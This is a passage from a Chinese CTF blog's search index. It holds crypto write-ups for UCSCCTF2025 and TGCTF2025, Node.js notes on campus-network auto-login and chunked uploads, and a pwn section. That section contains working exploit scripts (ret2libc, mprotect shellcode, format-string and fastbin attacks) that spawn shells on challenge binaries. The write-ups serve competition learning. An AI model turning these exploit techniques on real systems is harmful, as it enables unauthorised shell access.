","date":"2025-04-23","objectID":"/ny2025/:2:4","tags":["crypto"],"title":"能源大赛2025","uri":"/ny2025/"},{"categories":["CTF"],"content":"总结 质量还好吧，感觉格还是不太熟，得多练练 ","date":"2025-04-23","objectID":"/ny2025/:3:0","tags":["crypto"],"title":"能源大赛2025","uri":"/ny2025/"},{"categories":["CTF"],"content":"前言 高铁一个小时速通 ","date":"2025-04-20","objectID":"/ucscctf2025/:1:0","tags":["crypto"],"title":"UCSCCTF2025","uri":"/ucscctf2025/"},{"categories":["CTF"],"content":"题目 ","date":"2025-04-20","objectID":"/ucscctf2025/:2:0","tags":["crypto"],"title":"UCSCCTF2025","uri":"/ucscctf2025/"},{"categories":["CTF"],"content":"XR4 task.py import base64 import random from secret import flag import numpy as np def init_sbox(key): s_box = list(range(256)) j = 0 for i in range(256): j = (j + s_box[i] + ord(key[i % len(key)])) % 256 s_box[i], s_box[j] = s_box[j], s_box[i] return s_box def decrypt(cipher, box): res = [] i = j = 0 cipher_bytes = base64.b64decode(cipher) for s in cipher_bytes: i = (i + 1) % 256 j = (j + box[i]) % 256 box[i], box[j] = box[j], box[i] t = (box[i] + box[j]) % 256 k = box[t] res.append(chr(s ^ k)) return (''.join(res)) def random_num(seed_num): random.seed(seed_num) for i in range(36): print(chr(int(str(random.random()*10000)[0:2]) ^ (data[i]))) if __name__ == '__main__': ciphertext = \"MjM184anvdA=\" key = \"XR4\" box = init_sbox(key) a=decrypt(ciphertext, box) random_num(int(a)) 有一说一，懒得写，gpt梭哈了 exp.py import base64 def init_sbox(key: str) -\u003e list[int]: \"\"\" 初始化 RC4 的 S 盒（KSA 阶段） \"\"\" s_box = list(range(256)) j = 0 for i in range(256): j = (j + s_box[i] + ord(key[i % len(key)])) % 256 s_box[i], s_box[j] = s_box[j], s_box[i] return s_box def decrypt(cipher: str, box: list[int]) -\u003e str: \"\"\" RC4 解密（PRGA 阶段），输入是 base64 编码的密文 返回解密后的 ASCII 字符串 \"\"\" res = [] i = j = 0 cipher_bytes = base64.b64decode(cipher) for byte in cipher_bytes: i = (i + 1) % 256 j = (j + box[i]) % 256 box[i], box[j] = box[j], box[i] t = (box[i] + box[j]) % 256 k = box[t] res.append(chr(byte ^ k)) return ''.join(res) # 测试解密 ciphertext = \"MjM184anvdA=\" key = \"XR4\" seed_str = decrypt(ciphertext, init_sbox(key)) print(\"[*] RC4 解密后得到的 seed 字符串：\", seed_str) import numpy as np # 题目给出的转置后矩阵 transposed_matrix = np.array([ [ 1, 111, 38, 110, 95, 44], [ 11, 45, 58, 39, 84, 1], [116, 19, 113, 60, 91, 118], [ 33, 98, 38, 57, 10, 29], [ 68, 52, 119, 56, 43, 125], [ 32, 32, 7, 26, 41, 41] ]) # 先转置回来，再展平为一维数组 data = transposed_matrix.T.reshape(-1) import random def recover_flag(seed: int, data: np.ndarray) -\u003e str: random.seed(seed) chars = [] for i in range(len(data)): # 取 “[0:2]” 的做法和题目一致 two_digits = str(random.random() * 10000)[0:2] rand_val = int(two_digits) chars.append(chr(rand_val ^ data[i])) return ''.join(chars) # 执行还原 seed = int(seed_str) # 78910112 flag = recover_flag(seed, data) print(\"[*] 恢复出的 flag：\", flag) ","date":"2025-04-20","objectID":"/ucscctf2025/:2:1","tags":["crypto"],"title":"UCSCCTF2025","uri":"/ucscctf2025/"},{"categories":["CTF"],"content":"Lunz task.py from gmpy2 import * from hashlib import md5 from Crypto.Util.number import * from sympy import * message= xxxxxx flag = 'flag{'+md5(message).hexdigest()+'}' p = getPrime(250) q = getPrime(250) assert p \u003e q n = p * q e = 65537 phi = (p - 1) * (q - 1) m = bytes_to_long(message) Rod = getPrime(5) I = Rod + len(str(Rod)) k = pow(p, Rod) N = pow(p, I) * q d1 = getPrime(2000) d2 = nextprime(d1 + getPrime(1000)) e_1 = inverse(d1, (k * phi)) e_2 = inverse(d2, (k * phi)) c = pow(m,e,n) print(f'e_1 = {e_1}') print(f'e_2 = {e_2}') print(f'N = {N}') print(f'c = {c}') 对某题拙略的模仿罢了xd，d2比d1大1000bits的样子，与d1的比特数差的有点多，考虑构造关于差值的等式进行copper， 消掉d1后得到式子 $$ e_1*e_2*x-(e_1-e_2)=0 \\ mod \\ phi $$ 后面处理次方即可，直接把那个移过去了，结果真出来了xd 原型是D^3ctf的题，应该是个论文题来着 exp.py e = 65537 e1 = e2 = N = c = PR.\u003cx\u003e=PolynomialRing(Zmod(N)) f=e1*e2*x-(e1-e2) f=f.monic() root=f.small_roots(X=2^1020,beta=0.75,epsilon=0.05) print(e1*e2*root[0]-(e1-e2)) from Crypto.Util.number import * import gmpy2 from hashlib import md5 Rod = getPrime(5) I = Rod + len(str(Rod)) e = 65537 e1 = e2 = N = c = g= p=gmpy2.iroot(gmpy2.gcd(g,N),Rod)[0] q=N//(p**I) d=gmpy2.invert(0x10001,(p-1)*(q-1)) msg=long_to_bytes(pow(c,d,p*q)) print(msg) flag = 'flag{'+md5(msg).hexdigest()+'}' print(flag) ","date":"2025-04-20","objectID":"/ucscctf2025/:2:2","tags":["crypto"],"title":"UCSCCTF2025","uri":"/ucscctf2025/"},{"categories":["CTF"],"content":"essential 原题，不放了xd ","date":"2025-04-20","objectID":"/ucscctf2025/:2:3","tags":["crypto"],"title":"UCSCCTF2025","uri":"/ucscctf2025/"},{"categories":["CTF"],"content":"MERGE_ECC task.py import random from sympy import nextprime def part1(): p = random_prime(2^512, 2^513) a = random.randint(0, p-1) b = random.randint(0, p-1) while (4 * a**3 + 27 * b**2) % p == 0: a = random.randint(0, p-1) b = random.randint(0, p-1) E = EllipticCurve(GF(p), [a, b]) P=E.random_point() n = [random.randint(1, 2**20) for _ in range(3)] assert part1=''.join([hex(i)[2:] for i in n]) cipher = [n[i] * P for i in range(3)] print(f\"N = {p}\") print(f\"a = {a}, b = {b}\") print(f\"P = {P}\") for i in range(3): print(f\"cipher{i} = {cipher[i]}\") def part2(): p = a = b = P = E.random_point() Q = key*P print(\"p = \",p) print(\"a = \",a) print(\"b = \",b) print(\"P = \",P) print(\"Q = \",Q) assert part2=key part1() print(\"-------------------------------------------\") part2() assert flag=\"flag{\"+str(part1)+\"-\"+str(part2)+\"}\" part1暴力求解，part2是SmartAttack exp.py import math def inv_mod(x: int, p: int) -\u003e int: return pow(x, p-2, p) def point_add(P, Q, a, p): if P is None: return Q if Q is None: return P x1, y1 = P x2, y2 = Q if x1 == x2 and (y1 + y2) % p == 0: return None if P != Q: lam = ((y2 - y1) * inv_mod(x2 - x1, p)) % p else: lam = ((3 * x1 * x1 + a) * inv_mod(2 * y1, p)) % p x3 = (lam * lam - x1 - x2) % p y3 = (lam * (x1 - x3) - y1) % p return (x3, y3) def scalar_mul(P, n, a, p): R = None # 初始结果为无穷远点 Q = P # 临时变量 Q = P, 逐位处理 n while n \u003e 0: if n \u0026 1: R = point_add(R, Q, a, p) Q = point_add(Q, Q, a, p) n \u003e\u003e= 1 return R def dlog_bsgs(P, Q, order_bound, a, p): m = int(math.ceil(math.sqrt(order_bound))) table = {} R = None for j in range(m): table[R] = j R = point_add(R, P, a, p) mP = scalar_mul(P, m, a, p) neg_mP = (mP[0], (-mP[1]) % p) if mP is not None else None S = Q for i in range(m): if S in table: return i * m + table[S] S = point_add(S, neg_mP, a, p) return None def attack_part1(): p1 = a1 = b1 = P1 = () cipher = [] bound = 2**20 ns = [] for i in range(3): ni = dlog_bsgs(P1, cipher[i], bound, a1, p1) assert ni is not None, \"Part1 的 n{} 恢复失败！\".format(i) ns.append(ni) print(\"Part1 恢复出的 n 值：\", ns) hex_str = ''.join([hex(x)[2:] for x in ns]) print(\"拼接后的十六进制字符串：\", hex_str) return hex_str if __name__ == \"__main__\": part11 = attack_part1() print(part11) from sage.all import * from Crypto.Util.number import * p = a = b = E = EllipticCurve(GF(p),[a,b]) P = E() Q = E() print(p== E.order()) def SmartAttack(P,Q,p): E = P.curve() Eqp = EllipticCurve(Qp(p, 2), [ ZZ(t) + randint(0,p)*p for t in E.a_invariants() ]) P_Qps = Eqp.lift_x(ZZ(P.xy()[0]), all=True) for P_Qp in P_Qps: if GF(p)(P_Qp.xy()[1]) == P.xy()[1]: break Q_Qps = Eqp.lift_x(ZZ(Q.xy()[0]), all=True) for Q_Qp in Q_Qps: if GF(p)(Q_Qp.xy()[1]) == Q.xy()[1]: break p_times_P = p*P_Qp p_times_Q = p*Q_Qp x_P,y_P = p_times_P.xy() x_Q,y_Q = p_times_Q.xy() phi_P = -(x_P/y_P) phi_Q = -(x_Q/y_Q) k = phi_Q/phi_P return ZZ(k) m3 = SmartAttack(P,Q,p) print(m3) ","date":"2025-04-20","objectID":"/ucscctf2025/:2:4","tags":["crypto"],"title":"UCSCCTF2025","uri":"/ucscctf2025/"},{"categories":["CTF"],"content":"Ez_Calculate task.py from Crypto.Util.number import * from random import randint from hashlib import md5 flag1 = b'xxx' flag2 = b'xxx' Flags = 'flag{' + md5(flag1+flag2).hexdigest()[::-1] + '}' def backpack_encrypt_flag(flag_bytes, M, group_len): bits = [] for byte in flag_bytes: bits.extend([int(b) for b in format(byte, \"08b\")]) while len(bits) % group_len != 0: bits.append(0) S_list = [] for i in range(0, len(bits), group_len): group = bits[i:i + group_len] S = sum(bit * m for bit, m in zip(group, M)) S_list.append(S) return S_list def backpack(flag_bytes): R = [10] while len(R) \u003c 8: next_val = randint(2 * R[-1], 3 * R[-1]) R.append(next_val) B = randint(2 * R[-1] + 1, 3 * R[-1]) A = getPrime(100) M = [A * ri % B for ri in R] S_list = backpack_encrypt_flag(flag_bytes, M, len(M)) return R, A, B, M, S_list p = getPrime(512) q = getPrime(512) n = p*q e = 0x10000 m = bytes_to_long(flag1) k = randint(1, 999) problem1 = (pow(p,e,n)-pow(q,e,n)) % n problem2 = pow(p-q,e,n)*pow(e,k,n) c = pow(m,e,n) R, A, B, M, S_list = backpack(flag2) with open(r\"C:\\Users\\Rebirth\\Desktop\\data.txt\", \"w\") as f: f.write(f\"problem1 = {problem1}\\n\") f.write(f\"problem2 = {problem2}\\n\") f.write(f\"n = {n}\\n\") f.write(f\"c = {c}\\n\") f.write(\"-------------------------\\n\") f.write(f\"R = {R}\\n\") f.write(f\"A = {A}\\n\") f.write(f\"B = {B}\\n\") f.write(f\"M = {M}\\n\") f.write(f\"S_list = {S_list}\\n\") f.write(\"-------------------------\\n\") f.write(f\"What you need to submit is Flags!\\n\") part1多次rabin，part2当背包写 exp.py problem1 = problem2 = n = c = e = 0x10000 from Crypto.Util.number import * import gmpy2 # problem1 = (pow(p,e,n)-pow(q,e,n)) % n # problem2 = pow(p-q,e,n)*pow(e,k,n) for k in range(1, 999): tmp = problem1+problem2//pow(e,k,n) p = gmpy2.gcd(n,tmp) q = n // p if q!=1 and p!=1: print(p,q) p= q=n//p inv_p = gmpy2.invert(p, q) inv_q = gmpy2.invert(q, p) cs = [c] for i in range(16): ps = [] for c2 in cs: r = pow(c2, (p + 1) // 4, p) s = pow(c2, (q + 1) // 4, q) x = (r * inv_q * q + s * inv_p * p) % n y = (r * inv_q * q - s * inv_p * p) % n if x not in ps: ps.append(x) if n - x not in ps: ps.append(n - x) if y not in ps: ps.append(y) if n - y not in ps: ps.append(n - y) cs = ps for m in cs: print(long_to_bytes(m)) from Crypto.Util.number import inverse def decrypt_backpack(R, A, B, S_list): invA = inverse(A, B) bits = [] for S in S_list: s = (invA * S) % B group_bits = [] for r in reversed(R): if s \u003e= r: group_bits.append(1) s -= r else: group_bits.append(0) bits.extend(reversed(group_bits)) flag2_bytes = bytearray() for i in range(0, len(bits), 8): byte = 0 for b in bits[i:i+8]: byte = (byte \u003c\u003c 1) | b flag2_bytes.append(byte) return bytes(flag2_bytes).rstrip(b'\\x00') if __name__ == \"__main__\": R = [10, 29, 83, 227, 506, 1372, 3042, 6163] A = 1253412688290469788410859162653 B = 16036 M = S_list = flag2 = decrypt_backpack(R, A, B, S_list) print(\"解密得到的 flag2 =\", flag2) from hashlib import md5 flag1=b'CRYPTO_ALGORIT' flag2=b'HMS_WELL_DONE' Flags = 'flag{' + md5(flag1+flag2).hexdigest()[::-1] + '}' print(Flags) ","date":"2025-04-20","objectID":"/ucscctf2025/:2:5","tags":["crypto"],"title":"UCSCCTF2025","uri":"/ucscctf2025/"},{"categories":["CTF"],"content":"Logos 参考 https://blog.csdn.net/luochen2436/article/details/132332081 即可 ","date":"2025-04-20","objectID":"/ucscctf2025/:2:6","tags":["crypto"],"title":"UCSCCTF2025","uri":"/ucscctf2025/"},{"categories":["CTF"],"content":"总结 一个小时速通包爽的，但是原题太多了，真没意思xd ","date":"2025-04-20","objectID":"/ucscctf2025/:3:0","tags":["crypto"],"title":"UCSCCTF2025","uri":"/ucscctf2025/"},{"categories":["CTF"],"content":"前言 rank33，感觉自己还是太菜了，放一部分的wp ","date":"2025-04-14","objectID":"/tgctf2025/:1:0","tags":["crypto"],"title":"TGCTF2025","uri":"/tgctf2025/"},{"categories":["CTF"],"content":"题目 ","date":"2025-04-14","objectID":"/tgctf2025/:2:0","tags":["crypto"],"title":"TGCTF2025","uri":"/tgctf2025/"},{"categories":["CTF"],"content":"crypto AAAAAAAA·真·签到 ｜solved by zsm task 给你flag签个到好了 UGBRC{RI0G!O04_5C3_OVUI_DV_MNTB} 诶，我的flag怎么了？？？？ 好像字母对不上了 我的签到怎么办呀，急急急 听说福来阁好像是TGCTF开头的喔 思路就是先对照，然后对一下思路？UGBRC和TGCTF进行比较，位移是-1,0,1…，猜测每个增加1，搓个脚本 exp.py def caesar_shift(text): shift = -1 result = [] shift_count = 0 for char in text: if char.isalpha(): if char.isupper(): new_char = chr(((ord(char) - ord('A') + shift) % 26) + ord('A')) else: new_char = chr(((ord(char) - ord('a') + shift) % 26) + ord('a')) result.append(new_char) else: result.append(char) shift += 1 return ''.join(result) input_text = \"UGBRC{RI0G!O04_5C3_OVUI_DV_MNTB}\" output_text = caesar_shift(input_text) print(output_text) mm不躲猫猫｜solved by zsm 60组nc的广播攻击，先读取一下，然后直接爆，好像不用读取也行 读取.py import re def parse_nc_pairs(input_text): # Initialize dictionaries for n1, c1, n2, c2, ... n_values = {} c_values = {} # Regex to match [n_k] blocks and extract n and c pattern = r'\\[n_(\\d+)\\]\\s*n\\s*=\\s*(\\d+)\\s*c\\s*=\\s*(\\d+)' # Find all matches matches = re.findall(pattern, input_text, re.MULTILINE) for index, n_val, c_val in sorted(matches, key=lambda x: int(x[0])): n_key = f'n{index}' c_key = f'c{index}' n_values[n_key] = int(n_val) c_values[c_key] = int(c_val) return n_values, c_values # Read input from file (replace 'input.txt' with your file path) with open('challenge.txt', 'r') as f: input_text = f.read() # Parse into n1, c1, n2, c2, ... n_values, c_values = parse_nc_pairs(input_text) # Optional: Print to verify for i in range(1, 61): # Assuming 60 pairs n_key = f'n{i}' c_key = f'c{i}' if n_key in n_values and c_key in c_values: print(f\"{n_key} = {n_values[n_key]}\") print(f\"{c_key} = {c_values[c_key]}\") exp.py from Crypto.Util.number import* import gmpy2 e = 65537 #不用60组全拿 n = [n1,n2,n3,n4,n5,n6,n7,n8,n9,n10,n11,n12,n13,n14,n15,n16,n17,n18,n19] c = [c1,c2,c3,c4,c5,c6,c7,c8,c9,c10,c11,c12,c13,c14,c15,c16,c17,c18,c19] for i in range(len(n)): for j in range(len(n)): if (i!=j): t = gmpy2.gcd(n[i],n[j]) if t != 1: p = t q = n[i] // p d = gmpy2.invert(e,(p-1)*(q-1)) m = pow(c[i],d,n[i]) print(long_to_bytes(m)) tRwSiAns ｜solved by zsm task.py from flag import FLAG from Crypto.Util.number import getPrime, bytes_to_long import hashlib def generate_key(bits=512): p = getPrime(bits) q = getPrime(bits) return p * q, 3 def hash(x): return int(hashlib.md5(str(x).encode()).hexdigest(), 16) def encrypt(m, n, e): x1, x2 = 307, 7 c1 = pow(m + hash(x1), e, n) c2 = pow(m + hash(x2), e, n) return c1, c2 m = bytes_to_long(FLAG) n, e = generate_key() c1, c2 = encrypt(m, n, e) print(f\"n = {n}\") print(f\"e = {e}\") print(f\"c1 = {c1}\") print(f\"c2 = {c2}\") 富兰克林，直接写 exp.py from Crypto.Util.number import * import hashlib import sys import libnum def hash(x): return int(hashlib.md5(str(x).encode()).hexdigest(), 16) x1, x2 = 307, 7 h1,h2=hash(x1),hash(x2) n = e = 3 c1 = c2 = import binascii def franklinReiter(n,e,c1,c2,a,b): PR.\u003cx\u003e = PolynomialRing(Zmod(n)) g1 = (x+a)^e - c1 g2 = (x+b)^e - c2 def gcd(g1, g2): while g2: g1, g2 = g2, g1 % g2 return g1.monic() # return -gcd(g1, g2)[0] m=franklinReiter(n,e,c1,c2,h1,h2) print(libnum.n2s(int(m))) 宝宝rsa ｜solved by zsm task.py from math import gcd from Crypto.Util.number import * from secret import flag # PART1 p1 = getPrime(512) q1 = getPrime(512) n1 = p1 * q1 phi = (p1 - 1) * (q1 - 1) m1 = bytes_to_long(flag[:len(flag) // 2]) e1 = getPrime(18) while gcd(e1, phi) != 1: e1 = getPrime(17) c1 = pow(m1, e1, n1) print(\"p1 =\", p1) print(\"q1 =\", q1) print(\"c1 =\", c1) # PART2 n2 = getPrime(512) * getPrime(512) e2 = 3 m2 = bytes_to_long(flag[len(flag) // 2:]) c2 = pow(m2, e2, n2) print(\"n2 =\", n2) print(\"c2 =\", c2) print(\"e2 =\", e2) part1爆破e，part2小e攻击,爆破e的脚本自己写的很慢，ai启动 exp.py from math import gcd, isqrt from Crypto.Util.number import * import sys # 已知的 PART1 参数 p1 = q1 = c1 = # 已知的 PART2 参数 n2 = c2 = e2 = 3 phi = (p1 - 1) * (q1 - 1) n1 = p1 * q1 def is_candidate_valid(e): return gcd(e, phi) == 1 def get_primes_in_range(low, high): sieve = [True] * (high + 1) sieve[0] = sieve[1] = False for i in range(2, isqrt(high)+1): if ","date":"2025-04-14","objectID":"/tgctf2025/:2:1","tags":["crypto"],"title":"TGCTF2025","uri":"/tgctf2025/"},{"categories":["CTF"],"content":"pwn 签到 | solved by v2rtua1 没什么好说的，gets-\u003eret2libc from pwnfunc import * io, elf, libc = pwn_initial() set_context(term=\"tmux_split\", arch=\"amd64\") \"\"\"amd64 i386 arm arm64 riscv64\"\"\" prdi = 0x0000000000401176 ret = 0x000000000040101A puts = 0x0000000000401060 payload = b\"a\" * (0x78) + p(prdi) + p(elf.got[\"puts\"]) + p(puts) + p(elf.sym[\"main\"]) r() sl(payload) rl() pause() base = u(r(6).ljust(8, b\"\\0\")) - 0x80E50 binsh = base + 0x1D8678 system = base + 0x50D70 payload = b\"a\" * (0x78) + p(prdi) + p(binsh) + p(ret) + p(system) sl(payload) ia() overflow | solved by v2rtua1 x86的gets溢出题，同时是静态编译，尝试–ropchain一把梭没成功，观察到程序提供了很多gadget并且有mprotect函数，于是打mprotect写shellcode然后jmp过去 from pwnfunc import * io, elf, libc = pwn_initial() set_context(term=\"tmux_split\", arch=\"i386\") \"\"\"amd64 i386 arm arm64 riscv64\"\"\" name = 0x80EF320 read = 0x806F960 pop_3 = 0x080ADD9D mprotect = 0x08070A70 s( p(mprotect) + p(pop_3) + p(0x080EF000) + p(0x1000) + p(7) + p(read) + p(0x80EF300) + p(0) + p(0x80EF300) + p(0x1000) ) payload = b\"a\" * (0xD0 - 8) + p(name + 4) sl(payload) pause() s(b\"a\" * 24 + p(0x80EF318 + 4) + asm(shellcraft.sh())) ia() stack | solved by v2rtua1 一开始没看出啥门道，最后才发现可以溢出到原write的参数上，因为有sh字符串，改成system(\"/bin/sh\")就结束了 from pwnfunc import * io, elf, libc = pwn_initial() set_context(term=\"tmux_split\", arch=\"amd64\") \"\"\"amd64 i386 arm arm64 riscv64\"\"\" binsh = 0x000000000404108 trigger = 0x00000000004011B6 payload = b\"a\" * 0x40 + p(59) + p(binsh) + p(0) + p(0) s(payload) pause() payload = b\"a\" * 0x40 + p(0) + p(0x00000000004011D0) s(payload) ia() fmt | solved by v2rtua1 格式化字符串题，正常流程下来只有一次格式化机会因为0x30不够再写个0x114514进去了，于是观察栈构造，几次调试后发现可以修改printf返回地址到前几行代码，这样就可以实现循环printf 然后就是随便打了，泄露libc-\u003eonegadget from pwnfunc import * io, elf, libc = pwn_initial() set_context(term=\"tmux_split\", arch=\"amd64\") \"\"\"amd64 i386 arm arm64 riscv64\"\"\" magic = 0x0000000000404010 ret_off = 0x68 main = 0x00000000004011B6 ru(b\"your gift \") stack = int(r(len(\"0x7ffd10a3fb90\")), 16) ret_addr = stack + ret_off printf_got = 0x403FE0 success(hex(ret_addr)) \"\"\" 0xe3afe execve(\"/bin/sh\", r15, r12) constraints: [r15] == NULL || r15 == NULL || r15 is a valid argv [r12] == NULL || r12 == NULL || r12 is a valid envp 0xe3b01 execve(\"/bin/sh\", r15, rdx) constraints: [r15] == NULL || r15 == NULL || r15 is a valid argv [rdx] == NULL || rdx == NULL || rdx is a valid envp 0xe3b04 execve(\"/bin/sh\", rsi, rdx) constraints: [rsi] == NULL || rsi == NULL || rsi is a valid argv [rdx] == NULL || rdx == NULL || rdx is a valid envp \"\"\" payload = b\"%25c%8$hhn%19$p.\" + p(ret_addr - 0x70) s(payload) ru(b\"0x\") base = int(r(12), 16) - 0x24083 system = base + 0x52290 success(hex(base)) success(hex(system)) system = base + 0x52290 last3 = hex(system)[-6:] success(last3) og = base + 0xE3B01 last3 = hex(og)[-6:] F = int(last3[:2], 16) L = int(last3[2:], 16) M = int(last3[:3], 16) success(hex(og)) payload = bytes(f\"%{F}c%10$hhn\".encode(\"utf-8\")) payload += bytes(f\"%{L-F}c%11$hn\".encode(\"utf-8\")) payload = payload.ljust(0x20, b\"a\") payload += p(ret_addr + 2) + p(ret_addr) s(payload) ia() heap | solved by v2rtua1 2.23的堆题，提供alloc和free两个常规功能和一个附带功能，发现无show于是先想到unsorted bin爆破stdin泄露地址，但是发现只给了fastbin，结合没pie和uaf的特性往name上写入fastbin头得以控制list，然后因为有了任意free就可以再布置一个unsorted bin大小的chunk在name上，free完泄露libc直接打malloc_hook from pwnfunc import * io, elf, libc = pwn_initial() set_context(term=\"tmux_split\", arch=\"amd64\") \"\"\"amd64 i386 arm arm64 riscv64\"\"\" def menu(): ru(b\"\u003e \") def alloc(size, content): menu() sl(b\"1\") ru(b\"size?\") sl(str(size)) ru(b\"else?\") s(content) def free(idx): menu() sl(b\"2\") ru(b\"\u003e \") sl(str(idx)) def change(name): menu() sl(b\"3\") r() s(name) payload = ( (b\"\\0\" * 8 + p(0xA1) + p(0) * (9 * 2) + p(0xA1) + p(0x21) + p(0) * 2).ljust( 0xC0, b\"\\0\" ) + p(0x21) + p(0x71) ) s(payload) alloc(0x60, b\"a\") # 0 alloc(0x60, b\"a\") # 1 alloc(0x10, b\"a\") # 2 free(0) free(1) free(0) alloc(0x60, p(0x602180)) # 3 alloc(0x60, b\"a\") # 4 alloc(0x60, b\"a\") # 5 hptr = 0x6020C0 + 0x10 payload = p(0) * 2 + p(hptr) alloc(0x60, payload) # 6 # x=0x000000000","date":"2025-04-14","objectID":"/tgctf2025/:2:2","tags":["crypto"],"title":"TGCTF2025","uri":"/tgctf2025/"},{"categories":["CTF"],"content":"总结 没有web，misc那几个都简单就不放了（ ","date":"2025-04-14","objectID":"/tgctf2025/:3:0","tags":["crypto"],"title":"TGCTF2025","uri":"/tgctf2025/"},{"categories":["nodejs"],"content":"nodejs实现定时任务 用node-schedule这个模组去实现定时任务 然后这边实现自动登录校园网的(，首先先bp抓个包，发现里面东西有点多，就写了一堆配置文件，然后包成docker去定时发送 config.js const config = { loginUrl: 'http://ip/eportal/InterFace.do?method=login', userId: '', password: '', service: '中国移动', headers: { 'User-Agent': '', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'Accept': '*/*', 'Origin': '', 'Referer': 'http://ip/eportal/index.jsp', 'Cookie': 'EPORTAL_USER_GROUP=; EPORTAL_COOKIE_PASSWORD=; EPORTAL_COOKIE_DOMAIN=false; EPORTAL_COOKIE_USERNAME=; EPORTAL_COOKIE_SERVER=; EPORTAL_COOKIE_SERVER_NAME=; EPORTAL_COOKIE_SAVEPASSWORD=true; EPORTAL_COOKIE_OPERATORPWD=' } }; export default config; index.js import schedule from 'node-schedule'; import axios from 'axios'; import qs from 'qs'; import config from './config.js'; import fs from 'fs'; import path from 'path'; import { fileURLToPath } from 'url'; const __dirname = path.dirname(fileURLToPath(import.meta.url)); const logDir = path.join(__dirname, 'logs'); // 确保日志目录存在 if (!fs.existsSync(logDir)) { fs.mkdirSync(logDir); } // 日志函数 function log(message, isError = false) { const now = new Date(); const dateStr = now.toISOString().split('T')[0]; const timeStr = now.toLocaleString(); const logMessage = `${timeStr} - ${message}\\n`; // 控制台输出 console.log(logMessage); // 写入文件 const logFile = path.join(logDir, `${dateStr}.log`); fs.appendFileSync(logFile, logMessage); // 如果是错误，也写入错误日志 if (isError) { const errorFile = path.join(logDir, `${dateStr}-error.log`); fs.appendFileSync(errorFile, logMessage); } } async function login() { try { const data = { userId: config.userId, password: config.password, service: config.service, queryString: qs.stringify({ wlanuserip: '', wlanacname: '', ssid: '', nasip: '', snmpagentip: '', mac: '', t: '', url: '', apmac: '', nasid: '', vid: '', port: '', nasportid: '' }), operatorPwd: '', operatorUserId: '', validcode: '', passwordEncrypt: false }; const response = await axios({ method: 'post', url: config.loginUrl, headers: config.headers, data: qs.stringify(data) }); log(`登录结果: ${JSON.stringify(response.data)}`); } catch (error) { log(`登录失败: ${error.message}`, true); } } // 每天早上7点执行登录 schedule.scheduleJob('0 7 * * *', login); log('定时任务已启动，将在每天早上7点自动登录'); // 立即执行一次登录，测试配置是否正确 login(); 感觉学校这边有点怪，甚至会判定是学生还是老师登录，这玩意还分的？网速不一样呗bro dockerfile FROM node:18-alpine WORKDIR /app COPY package*.json ./ RUN npm install COPY . . CMD [\"node\", \"index.js\"] docker-compose.yml version: '3' services: campus-login: build: . container_name: campus-login restart: always environment: - TZ=Asia/Shanghai volumes: - ./config.js:/app/config.js - ./logs:/app/logs logging: driver: \"json-file\" options: max-size: \"10m\" max-file: \"3\" 然后就好了，只得一提的是Cron表达式，和linux的是一样的 * * * * * * ┬ ┬ ┬ ┬ ┬ ┬ │ │ │ │ │ │ │ │ │ │ │ └── 星期（0 - 6，0表示星期日） │ │ │ │ └───── 月份（1 - 12） │ │ │ └────────── 日（1 - 31） │ │ └─────────────── 小时（0 - 23） │ └──────────────────── 分钟（0 - 59） └───────────────────────── 秒（0 - 59） ","date":"2025-04-09","objectID":"/study_nodejs5/:1:0","tags":["开发","study"],"title":"Study nodejs 「5」","uri":"/study_nodejs5/"},{"categories":["nodejs"],"content":"文件上传 这个问题其实很简单，就是前端向后端发送一个文件，后端接收到文件后，保存到指定位置，然后返回给前端一个状态码，表示上传成功或者失败。 但是当文件很大时就会有一个问题，如果我网络突然崩了，再整体重新上传，那不就炸了吗？所以我们可以分段上传，比如一个文件被分成了十份，我在上传到最后一点时寄了，重新上传时只需上传最后一份即可 ","date":"2025-04-09","objectID":"/study_nodejs5/:2:0","tags":["开发","study"],"title":"Study nodejs 「5」","uri":"/study_nodejs5/"},{"categories":["nodejs"],"content":"前端部分 \u003cinput id=\"file\" type=\"file\"\u003e \u003c!--用来上传文件--\u003e 定义chunks去切片 文件切片 file 接受文件对象，注意file的底层是继承于blob的因此他可以调用blob的方法，slice进行切片，size就是每个切片的大小 const file = document.getElementById('file') file.addEventListener('change', (event) =\u003e { const file = event.target.files[0] //获取文件信息 const chunks = chunkFun(file) uploadFile(chunks) }) const chunkFun = (file, size = 1024 * 1024 * 4) =\u003e { const chunks = [] for (let i = 0; i \u003c file.size; i += size) { chunks.push(file.slice(i, i + size)) } return chunks } 循环调用接口上传，并且存储一些信息，当前分片的索引，注意file必须写在最后一个，因为nodejs端的multer 会按照顺序去读的，不然读不到参数, 最后通过promise.all 并发发送请求，等待所有请求发送完成，通知后端合并切片 const upload = (chunks) =\u003e { const list = [] for (let i = 0; i \u003c chunks.length; i++) { const formData = new FormData() formData.append('index', i) formData.append('filename', zsm) formData.append('flie', chunks[i]) list.push(fetch('http://localhost:3000/upload', { method: 'POST', body: formData })) } Promise.all(list).then(res =\u003e { fetch('http://localhost:3000/merge', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ filename: zsm }) }) console.log('上传成功') }) } ","date":"2025-04-09","objectID":"/study_nodejs5/:2:1","tags":["开发","study"],"title":"Study nodejs 「5」","uri":"/study_nodejs5/"},{"categories":["nodejs"],"content":"node端 比较值得注意的问题是上传时是分块的，所以我们需要合并，将分块的存入uploads，然后读取出来排序后再合并即可，严谨一点加点判断什么的 import express from 'express' import multer from 'multer' import cors from 'cors' import fs from 'fs/promises' import { existsSync, mkdirSync } from 'fs' import path from 'path' // 确保上传目录和视频目录存在 const uploadDir = path.join(process.cwd(), 'uploads') const videoDir = path.join(process.cwd(), 'video') ;[uploadDir, videoDir].forEach(dir =\u003e { if (!existsSync(dir)) { mkdirSync(dir, { recursive: true }) } }) const storage = multer.diskStorage({ destination: function (req, file, cb) { cb(null, 'uploads/') }, filename(req, file, cb) { cb(null, `${req.body.index}-${req.body.filename}`) } }) // 添加文件过滤器 const fileFilter = (req, file, cb) =\u003e { // 记录文件信息 console.log('上传文件信息:', { fieldname: file.fieldname, originalname: file.originalname, mimetype: file.mimetype, size: file.size }) // 接受所有文件类型 cb(null, true) } const upload = multer({ storage, fileFilter, limits: { fileSize: 500 * 1024 * 1024, // 增加文件大小限制到500MB } }) const app = express() app.use(cors()) app.use(express.json()) // 错误处理中间件 const errorHandler = (err, req, res, next) =\u003e { console.error(err) res.status(500).json({ error: err.message || '服务器内部错误' }) } app.post('/upload', upload.single('file'), (req, res) =\u003e { try { if (!req.file) { return res.status(400).json({ error: '没有接收到文件' }) } res.json({ 